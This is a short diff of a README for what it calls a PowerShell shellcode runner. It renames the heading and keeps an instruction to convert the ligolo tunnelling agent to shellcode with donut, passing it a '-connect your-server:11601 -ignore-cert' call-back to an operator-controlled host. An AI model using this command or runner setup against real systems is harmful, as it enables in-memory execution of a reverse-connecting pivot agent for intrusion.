@@ -1,4 +1,4 @@
-### ligolo.ps1 
+## Powershell Shellcode Runner 
 Make sure to convert agent.exe of ligolo to shellcode:
 - `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe`
 
